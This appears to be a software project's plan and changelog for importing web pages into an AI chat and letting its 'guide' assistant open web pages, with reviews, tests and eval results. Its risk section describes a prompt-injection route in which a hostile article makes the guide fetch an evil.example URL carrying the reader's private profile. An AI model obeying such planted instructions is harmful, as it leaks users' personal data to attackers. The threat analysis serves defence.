# Bring a web page into Chat, and whether the guide may open pages

**Status:** stage 1 (1A) built on `dev`, 2026-10-17 (§ What landed). Stage 2 was planned as 2A
and asked of Greg as [q-g492eq](../user-feedback/questions/q-g492eq.md); he chose B (reply
`spya-cab6zp`, 2026-10-18), and § Stage 2 is now 2B, landed on `dev` 2026-10-18 under queue item
`qi-qsy8nqyt` (§ What landed).
**Why:** Greg's reply `spya-eqtvhz` (2026-10-17 13:08 UTC) to
[q-madusw](../user-feedback/questions/q-madusw.md), about report `spya-vc6uzm`
(`SPIDERYARN-READING2-HY`), queue item `qi-jbfehgss`:

> 1A and 2A / Re guide: our approach should be that it prefers to hand off substantive work (e.g. by
> offering to create new Chat threads), but that it's not hobbled by lack of tools/capability/access
> if it tries to do things
>
> — Greg, 2026-10-17, reply `spya-eqtvhz` to q-madusw

- **1A**: a *Bring into this chat* button on each link of a search result and on a pasted address.
  Pressing it imports the page as the Add box does, then puts it in the composer as an @-mention,
  through the path plan [261012d](261012d-chat-at-mention-your-own-articles.md) built.
- **2A**: the guide may open a search result and read the page, as Chat can. That adds
  `read_web_page` to `toolsFor('guide')`, and a conversation's tool list is a listed defence
  ([security-map.md](../project/security-map.md), the `src/chat-tools.ts` row). An unattended run
  does not edit a defence on a reply alone, so 2A is planned here (§ Stage 2) and the build is asked
  of Greg in a new question.
- **The guide principle** (prefer handing off, never hobbled) is recorded in the doc that owns the
  guide, [chat-tools.md § The guide](../project/chat-tools.md#the-guide).

Prior work: [261012g](261012g-web-search-through-a-subagent-for-chat-and-the-guide.md) § Stage 3
named this exact seam ("a reader-pressed button that imports the page to the shelf through the
ingest queue, then puts it in the composer as a pending mention"); [261012d](261012d-chat-at-mention-your-own-articles.md)
is the mention path. Nothing of 1A exists on `origin/dev` as of `8052f3b78`.

## Stage 1 — 1A: *Bring into this chat*

### What the reader gets

```
 AI:  Three reviews disagree about the effect size …
      FROM THE WEB
      Smith 2024, Replication  ·  [⇣ Bring into this chat]
      A blog's critique        ·  [⇣ Bring into this chat]

 (pressed)
      Smith 2024, Replication  ·  Adding to your shelf…            ← a PDF says minutes
      Smith 2024, Replication  ·  ✓ In the box below                 ← chip added

 Bringing in: [Smith 2024, Replication ×]
 ┌──────────────────────────────────────────────┐
 │ compare with https://example.com/essay @Smith 2024, Replication │
 └──────────────────────────────────────────────┘
 [⇣ Bring example.com/essay into this chat]         ← the pasted address
```

- **Where the button is**:
  - on each row of *From the web* (`WebSources`, the provider search's sources under a Chat answer);
  - under the composer, one per web address in the draft (at most three, the mention cap), for an
    address the reader pasted or typed.
  - **Typed Chat only** (`kind: "chat"`), because only Chat takes mentions (261012d). Not the guide,
    Learn, Tutorial, Explore or the dialog's other kinds.
- **What pressing does**:
  1. `POST /api/jobs { url, ownCopy: true }` through `useJobs().add`, the same call the link hover
     card's *add to Spideryarn* makes (`WithAddToShelf` in `ProseHoverCard.tsx`). So the slot,
     deduplication and the 402 are the server's, as everywhere else.
  2. **Already on the shelf** → `200 { article }`, free: the chip is added at once.
  3. **The open article itself** → the button says so, and nothing is added (the server would
     refuse the mention).
  4. **A new import** → the button shows the job's progress; when the job is `done`, the chip is
     added. Not on `openEarly`: `admitMentions` refuses until a revision is published, so the
     button waits for `done`.
  5. **Refused** (no slots, a page we cannot read) → the server's sentence, read with
     `lastFailure()` straight after the await, and the button again only when `worthRetrying`
     says another go could help. **A failed job** → its error, and **no button**: another
     `POST /api/jobs` is a fresh add, not a retry of that job (Sol F3; the hover card's
     `describeAdd` made the same call).
- **The chip's title**, in order: a finished job's title; for a free repeat, the article's title
  off the shelf the `@` list reads (`loadMentionCandidates`); else the link's own words under an
  answer, else the address's host (Sol F4).
- **The chip, and the text**: `@Short title ` is appended to the end of the box, and the chip joins
  the *Bringing in* row exactly as a pick from the `@` picker does. The reader then asks their
  question; nothing is sent by the press.
- **Cost, said on the button**: its tooltip and accessible description say *"Adds the page to your
  shelf, which uses one article from your allowance, then brings it into this conversation."* An
  admin is exempt on the server, as for every add.

### Decisions, and the simpler options passed over

- **`ownCopy: true`, always.** A page someone else has made public would otherwise answer
  `{ publicCopy }` and offer the free copy, but Chat reads only the reader's own articles (261012d;
  widening that is a separate defence edit Greg has not asked for). So the press asks for the
  reader's own copy, which is what *Bring into this chat* needs. It still answers a repeat for the
  reader's own shelf first, free (`routes.ts` asks the shelf before `ownCopy`).
- **The press is remembered per address, for the tab** (a module map keyed on `urlKey`, as the
  hover card does), **and forgotten when the tab's reader changes** (`forgetOnReaderChange`, with a
  generation checked after every await), so reader B never sees reader A's job or slug (Sol F2). Switching thread or mode mid-import does not lose it: the job runs on (the job
  engine is tab-wide), and coming back finds the button at *On your shelf · Bring into this chat*,
  which adds the chip at once. **The chip is added automatically only by the button that was
  pressed, while it is still on screen**, so a chip never lands in a conversation the reader has
  since left.
- **How a button in the transcript reaches the composer**: the composer of the open thread
  registers an `add(mention)` function with the panel (a ref), and the transcript's buttons call it.
  The composer's own pasted-address buttons call it directly. No `useEffect` nonce, no store write:
  the composer already owns its row (`useMentionPicker`), and a second writer to the draft store
  is exactly the braid 261012d's round 2 (R2-3) untangled.
  - The add respects the per-question cap (`pickRefusal`) and returns its refusal, which the button
    shows. It reads the row as of the last write (a ref kept with `setPicked`), so two imports
    finishing in one render cannot both pass the cap (Sol F1).
  - While a question with chips is on its way (`mentionWaiting`), the row is that question's and the
    draft keeps none, so the add is refused with a sentence to try again in a moment (Sol F1).
  - The hook gains `add({ slug, title })` beside `pick`; the `@` text goes at the end of the box,
    with `insertedAt` where it was written, so × takes it out again.
- **Not built in v1, each said here**:
  - a button on links inside an answer's prose, or on a guide's `search_web` links (the guide takes
    no mentions; a guide's link can be pasted into Chat, which then offers the button);
  - a button on a *sent* question that held an address (user messages are plain text, not linked;
    the reader can paste it again, and the repeat is free);
  - removing the article from the shelf afterwards: it is an ordinary article, archived or deleted
    the ordinary way.

### Tests, red first

- The pure state of a button (`describeBringIn`, beside `describeAdd`): every outcome above, the
  open article, a repeat, a refusal, a running and a failed job, and the cap.
- `pastedAddresses(draft)`: web addresses only, once each by `urlKey`, at most three, nothing for
  a bare word.
- The hook's `add`: the `@` text at the end with one space, the chip appended once, a fourth
  refused with the cap's sentence, and × after an add taking its text out.
- One component test: pressing a *From the web* row with a stubbed `POST /api/jobs` answering a
  repeat puts the chip in the composer's row.
- One browser pass (Sonnet subagent, Playwright on the box) at 1440 and 390: a repeat, a fresh web
  page import to `done`, a pasted address, the cap, and the open article.

## Stage 2 — 2B: the guide may open a page, as Chat does

**Greg chose B**, not the A this section first planned:

> B
>
> — Greg, 2026-10-18 10:28 UTC, reply `spya-cab6zp` to [q-g492eq](../user-feedback/questions/q-g492eq.md)

Option B as the question put it: *"Yes, but as Chat has it: the guide may open any address,
including one it writes itself. Fewer refusals, but it gains the one way a hostile article could
get your About you out."* So the allowlist of handed addresses planned here first (after Sol's F5)
is dropped, and the risk it closed is recorded as accepted
([security-risks.md § R29](../project/security-risks.md#r29)). The A design is in this file's
history (`git log -p` on it) should the allowlist be wanted later, for the guide or for Chat, which
[chat-tools.md § Still open](../project/chat-tools.md#still-open) still names as its fix.

### What changes

- `read_web_page` joins `GUIDE_TYPED_TOOLS` in [`src/chat-tools.ts`](../../src/chat-tools.ts),
  after `search_web`: the typed guide only, not `GUIDE_TOOLS` (which Live is offered; Live is its
  own item). The definition is Chat's, picked out of `CHAT_TOOLS` by name as `GUIDE_TOOLS` is, so
  it has one home.
- **Every check Chat's `read_web_page` has, unchanged, and nothing more**: the same function
  (`readWebPage`), so the URL caps (`MAX_URL_QUERY_CHARS` 256 on query and fragment, `MAX_URL_CHARS`
  2,048 on the whole), the open article's own address refused, `fetchDocument`'s scheme check,
  private-address guard, redirect limit and size cap, no PDFs, 12,000 characters, the fence. Any
  address the model writes is fetched if those pass, as in Chat.
- **One read a turn for the guide** (`READ_WEB_PAGE_PER_TURN_GUIDE = 1`, Sol F6). Kept: Greg's B
  is about *which* address may be opened, and the brief that carried his reply says "one page per
  answer as planned". A second is refused before any fetch, as `search_web`'s third is, counted per
  `ToolContext` the same way (`searchesThisTurn`'s pattern). **Counted only when a read would
  fetch**: the count is asked through `fetchDocument`'s `beforeFirstRequest`, after its URL, scheme,
  DNS and address refusals and immediately before the first HTTP request, so an address refused for
  what it is costs no read, and no HTTP request is sent by a refusal. Sol's F4 asked for `search_web`'s count-on-dispatch
  instead; not taken, since a refused read sends nothing and spending the one read on it would
  only cost the reader the page. Chat keeps its lack of a read-specific cap (its turn still has
  the 120-second deadline and three tool rounds).
- **Live's guide stays without it, and is gated so** (Sol F1, found in the build too): Live's
  endpoint accepts any `CHAT_TOOLS` name and then asked `runTool`'s gate with `kind: "guide"`,
  i.e. `toolsFor("guide")`, which now holds `read_web_page`. So `ToolContext` gains `spoken`, set
  by that endpoint, and a spoken call is gated by `spokenToolsFor(kind)`, the same list
  `liveTools` offers (one function, so offered and runnable cannot drift).
- **`search_web`'s result tells the guide it can read one**, with no change: `canReadPages` is
  already computed from `toolsOf(ctx.kind)`.
- **The prompt** (`GUIDE_SYSTEM`'s YOUR TOOLS, reworded per
  [prompting-guide.md](../project/prompting-guide.md)), carrying Greg's principle: substantive work
  on the subject still goes to Chat (the *Ask in Chat* step); the guide may open one page a turn
  when that answers a question about how to read this piece — a page the reader hands it (is this
  review fair, is this worth reading alongside), or a search result whose sentence does not settle
  it. "You cannot read a web page" and "Chat can do what you cannot: open a page" go. It still
  answers inside its 60-word rule. It gains `WEB_LINKS`, the shared never-invent-a-URL rule every
  other web-capable prompt carries (Sol F2), and the last-round nudge says "article and web tools"
  (Sol F6).
- **Docs**, in the same change: chat-tools.md (§ The eleven, § The guide, § Security,
  § Still open), security-map.md's `src/chat-tools.ts` row (the guide's page-reading, its one read
  a turn, and that its addresses are unrestricted, by Greg's choice), and
  [security-risks.md](../project/security-risks.md) R29 with Greg's reply quoted.

### What it risks, said plainly

- **A new outbound channel for the guide, accepted.** A GET is an outbound request: a hostile
  article could tell the guide to read `https://evil.example/<the reader's About you>`, up to
  2,048 characters, path included (the 256 cap is on query and fragment only). The guide holds the
  reader's reason and *About you* every turn. With one read and two searches a turn, that is three
  model-issued calls a turn that can carry text out (one search may run several provider
  searches, and a fetch may follow redirects), the read the widest (Sol F7). Chat has had this exposure since 2026-08-26
  ([chat-tools.md § Security](../project/chat-tools.md#security-a-tool-result-is-data-and-one-of-them-is-a-strangers)).
  Greg accepted it for the guide on 2026-10-18 (R29). What bounds it: one read a turn, the length
  caps, `PROFILE_RULES` (prompt text, not a boundary), and the turn being the reader's own: a
  hostile article must be one the reader opened and then talked to the guide about.
- **A page the guide opens is a stranger's text**, fenced, as in Chat.
- **Cost and latency** (Sol F6): a page adds up to 12,000 characters and up to 20 seconds, in a
  conversation whose answers are meant to be short. One read a turn bounds it; the eval measures it.
- **Drift from its job.** Mitigated by the prompt and measured by the eval below.

### How it is checked

- Tests (red first where they assert new behaviour): the typed guide's tool list includes
  `read_web_page` and Live's (`GUIDE_TOOLS`) does not (`tests/guide-tool-gate.test.ts`, whose
  refused list loses it); a guide's read reaches the fetcher, including for an address that
  appears nowhere in the conversation (B, said as a test so a later allowlist is a deliberate
  change); a second read in one guide turn is refused unfetched while a new turn starts at zero;
  Chat's reads stay uncapped; the open article's own address is refused for the guide as for Chat;
  `search_web` tells the guide it can read one; the prompt no longer says it cannot open pages
  (`tests/web-reach-every-kind.test.ts`).
- The paid eval, [`evals/chat-web-reach.ts --kind guide`](../../evals/chat-web-reach.ts) (the
  guide eval in `evals/guide/run.ts` runs with tools off, so it cannot see a read), before and
  after, with one new target case, **given**: the reader hands the guide an address and asks
  whether it is worth reading alongside the piece. Counted per case: reads, searches, seconds,
  prose words, and whether the content-question control (`since`) still hands off to Chat with no
  read. `evals/guide/run.ts` is re-run once after, to check the prompt change moved nothing it
  scores.
- Sol on the plan (read-only) and on the code (write-capable), as for every change.

## Stages

1. **1A, client** (one commit, then Sol's code review and its fixes):
   `src/web/bring-in.ts` (pure: `describeBringIn`, `pastedAddresses`),
   `src/web/BringIntoChat.tsx` (the button and its import), `useMentionPicker().add`,
   `Composer` and `WebSources` wiring in `ChatPanel.tsx`, CSS, tests; the browser pass.
2. **Docs and bookkeeping**: chat-tools.md (§ Bringing in…, the guide principle in § The guide),
   web-client.md if it lists the new files, this plan's § What landed; the new question file;
   q-madusw answered; the report's note; `feedback-endings.ts`.
3. **2B, after Greg's reply B** (2026-10-18, `qi-qsy8nqyt`): Sol on this plan's § Stage 2; the
   eval's baseline; `src/chat-tools.ts` and the prompt with their tests; the eval after; the docs
   (chat-tools.md, security-map.md, security-risks.md R29); Sol on the code; q-g492eq answered and
   the report's note.

## Reviews

- **Sol plan review** ([prompt](261017e-plan-review-prompt.md),
  [answer](261017e-plan-review-sol.md)): *no P0*; three P1s for 1A and two findings on stage 2.
  All checked against the code and taken:
  - F1, the cap read from the row's latest write, and no add while a question is on its way;
  - F2, the reader-change fence, with a test;
  - F3, no button on a failed job (the plan had said otherwise; the code already did this);
  - F4, the chip title's order, with the shelf's title for a repeat rather than the host;
  - F5, the guide's real boundary: up to 2,048 characters, path included, and four outbound
    actions a turn with search. Taken further than Sol's either/or: the allowlist of handed
    addresses, which removes the composed URL altogether;
  - F6, one read a turn, and the eval measures time, rounds and tokens.
  - Sol confirmed: waiting for the import job's `done` is right (the stand-in revision publishes
    with it, and `admitMentions` accepts it); `ownCopy: true` is right; 1A edits no listed
    defence.
- **Sol code review** ([prompt](261017e-code-review-prompt.md), [diff](261017e-code-review.diff),
  [answer](261017e-code-review-sol.md)), write-capable: *no P0*, and it fixed what it found
  (`f3bd4ca26`). Checked and kept:
  - two buttons for one address (or two quick presses) could POST twice: every button for an
    address now shares the tab's record and is woken by it, and a press on a stale `offer` joins
    the import in flight instead of starting another;
  - an import could start, and spend a slot, with the row already full or a question with chips on
    its way: `BringIn.refusal()` is asked before the POST;
  - the row is read at its last write everywhere in `useMentionPicker` (pick, add, remove, edit,
    send), not only in `add`, so a chip taken out and an import finishing in one render cannot
    bring the chip back;
  - a free repeat of an unread paper (`processing: "minimal"`) would have made a chip the send
    then refused: it now says to open it and choose *Read this*;
  - a finished job is written into the record, so a job that later leaves the engine's list does
    not turn *Added* back into *Adding…*;
  - the composer clears the seam only if it still owns it.
  - One change after it: the source buttons' accessible name starts with the visible words
    (*Bring into this chat: Title*), so a voice command that says what is on the button finds it.

- **Sol plan review of 2B** ([prompt](261017e-2b-plan-review-prompt.md),
  [answer](261017e-2b-plan-review-sol.md)), read-only: *build with the P1 fixes*, no P0.
  - F1, Live's endpoint would have run `read_web_page` for a guide session: taken (`spoken`,
    `spokenToolsFor`, a route test); the build had found it too.
  - F2, `WEB_LINKS` in the guide's prompt: taken.
  - F3, the eval could not see cost per turn, which page was read, or the chat step: taken; it now
    keeps reads (requested address, whether text was fetched, host, ms and outcome), the steps
    offered, rounds, model-call count, input tokens and dollars per turn, and the
    before run was repeated with the new eval on the unchanged code.
  - F4, the test inventory (`guide-kind`, the live route) and stale comments: taken. Its ask that a
    refused read spend the allowance: not taken (§ Stage 2, one read a turn).
  - F5, the status claimed built before it was: corrected.
  - F6, the last-round nudge: taken. F7, risk wording: taken.
- **Sol code review of 2B** ([prompt](261017e-2b-code-review-prompt.md),
  [diff](261017e-2b-code-review.diff), [answer](261017e-2b-code-review-sol.md)), write-capable:
  *ship after the fixes made here*, no P0. Checked and kept:
  - F1 (P1), an address `fetchDocument` refuses (a `file:` scheme, a private address, DNS) still
    spent the guide's one read, because the count sat before the fetcher's own refusals: the count
    moved to a `beforeFirstRequest` option on `fetchDocument`, asked once before the first HTTP
    request (not again on retries or redirects), off by default so ingest is unchanged; tests in
    `tests/fetch.test.ts` and `tests/chat-tools.test.ts`; postmortem
    [261018d](../postmortems/261018d-entering-a-fetch-abstraction-is-not-dispatching-a-request.md);
  - F2, the eval recorded a read's host, not its address, and counted refused reads as reads: it now
    records the requested address and whether a page reached the model, plus rounds and calls;
  - F3, stale wording in chat-tools.md, live-conversation.md, the prompt and the help page.
  - It found no other path to `read_web_page` for a guide: typed turns reuse one context, Live
    sets `spoken`, and nothing in `src/web/` assumes the guide cannot read.

## What landed

- **Stage 1**: `0d10b7ea2` (the feature), `f3bd4ca26` (Sol's fixes). Files:
  [`src/web/bring-in.ts`](../../src/web/bring-in.ts), [`src/web/BringIntoChat.tsx`](../../src/web/BringIntoChat.tsx),
  `useMentionPicker().add` / `addRefusal` in [`MentionPicker.tsx`](../../src/web/MentionPicker.tsx),
  `withMentionAtEnd` in [`mentions.ts`](../../src/web/mentions.ts), and in
  [`ChatPanel.tsx`](../../src/web/ChatPanel.tsx) the composer's hand-over (`bringIn`, registered on
  `Conversation`'s `bringInTo` ref), its pasted-address row, and `WebSources`' buttons. Tests:
  `tests/bring-in.test.ts`, `tests/bring-into-chat.test.tsx`; each guard was seen to fail with its
  line removed (`ownCopy`, the guide's box, the row read at render, the reader-change fence).
- **Departure from § Stage 1**: a free repeat looks its title up on the shelf the `@` list reads,
  rather than falling back to the host — which also tells an unread paper apart (Sol).
- **Browser pass** (Sonnet, Playwright on the box, 1440 and 390, no console errors; shots
  `261017e-shot-*.png`). A pasted repeat went in in under a second, a new Wikipedia page in 17 s,
  the open article said so, and the guide's box had no button. **It found two bugs, both fixed in
  `53b58f38c` with tests seen red first**:
  - every *From the web* button refused, because Sol's seam read `?.refusal() ?? BOX_GONE_BEFORE`
    and `null` is the box's yes; now `bringVia`, which refuses only a missing box;
  - the first Enter after a bring-in was swallowed: the `@` it wrote read as a new `@` search while
    the shelf list loaded. An `@` a chip in the row wrote is no longer a search.

  Re-checked after: a new page from *From the web* in 9 s at 1440 and 5 s at 390, a repeat in
  0.7 s, a site that refuses automated readers says so, Enter sends at once, and a second press
  adds nothing twice. Known and left: the button on a pasted address of the open article says so
  only once pressed (the box does not know the open article's address).
- **Stage 2 (2B)**: landed on `dev` 2026-10-18 under `qi-qsy8nqyt`, after Greg's reply B
  (`spya-cab6zp`) to q-g492eq. `READ_WEB_PAGE_TOOL` and `READ_WEB_PAGE_PER_TURN_GUIDE` in
  [`src/chat-tools.ts`](../../src/chat-tools.ts), `ToolContext.spoken` and `spokenToolsFor` (Live's
  offer and gate, [`src/live.ts`](../../src/live.ts), `liveTool` in `src/routes.ts`),
  `beforeFirstRequest` in [`src/fetch.ts`](../../src/fetch.ts), `GUIDE_SYSTEM` in
  [`src/converse.ts`](../../src/converse.ts); risk [R29](../project/security-risks.md#r29).
  Tests red first for the guide's list, a composed address fetched, the one read a turn, the open
  article, and the Live guide refused. Measured in
  [261018d](../investigations/261018d-guide-reads-web-pages-measured.md): a page the reader hands
  over read 6 of 6 times (0 before), no search result opened, the subject still sent to Chat, about
  $0.025 and 5 s a read, a planted read tried 0 of 3 times, answers a few words longer.
